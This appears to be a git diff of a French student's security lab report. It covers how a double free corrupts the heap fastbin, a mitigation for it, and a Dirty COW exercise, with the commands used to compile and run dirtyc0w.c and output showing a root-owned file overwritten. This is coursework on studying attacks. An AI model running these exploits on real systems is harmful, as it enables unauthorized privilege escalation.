@@ -101,26 +101,27 @@ Donc on peut pas remplacer le pengouin simplement avec la commande dd.
 On va tenter un programme simple: double_free.c
 Ce programme fait 2 fois la commande free sur le pointeur a. Pour eviter l'erreur "double free corruption", on fait un free pour b entre les 2 free de a.
 L'etat de fastbin est comme suivant :
-'a' freed.
+
+'a' libere.
   ```head -> a -> tail```
 
-'b' freed.
+'b' libere.
 
   ```head -> b -> a -> tail```
 
-'a' freed again.
+'a' libere encore une fois.
 
   ```head -> a -> b -> a -> tail```
 
-'malloc' request for 'd'.
+'malloc' pour 'd'.
 
   ```head -> b -> a -> tail [ 'a' is returned ]```
 
-'malloc' request for 'e'.
+'malloc' pour 'e'.
 
   ```head -> a -> tail [ 'b' is returned ]```
 
-'malloc' request for 'f'.
+'malloc' pour 'f'.
 
   ```head -> tail [ 'a' is returned ]```
 Donc on peut voir que d et f point sur le meme pointeur. On peut modifier l'autre pointeur pour avoir une execution d'une fonction d'attaque. 
@@ -135,3 +136,18 @@ Fiabiliser l'OS pour qu'il ne soit pas vulnérable aux débordement de buffer, p
 #### Double Free
 Pour éviter l'exploitation de double free, il faut attribuer le pointeur a NULL le pointeur avant libérer. Quand on fait cela, il ne contient plus l'ancienne adresse et si un deuxième free arrive cela ne dommage rien car on peut pas liberer un pointeur NULL.
 
+
+
+# TD5 : Exploitation de Dirty Cow.
+J'ai cree un fichier foo avec le droit de root. Donc l'utilisateur normale (minh) ne peut pas modifier le contenu de ce fichier.
+<img src="./screenshot/foo_test.png">
+Apres avoir lance le programme Dirtycow. j'ai obtenu le resultat suivant:
+```
+$ gcc -pthread src/dirtyc0w.c -o /out/dirtyCow/dirtyc0w
+$ ./out/dirtyCow/dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat out/dirtyCow/foo
+m00000000000000000
+```
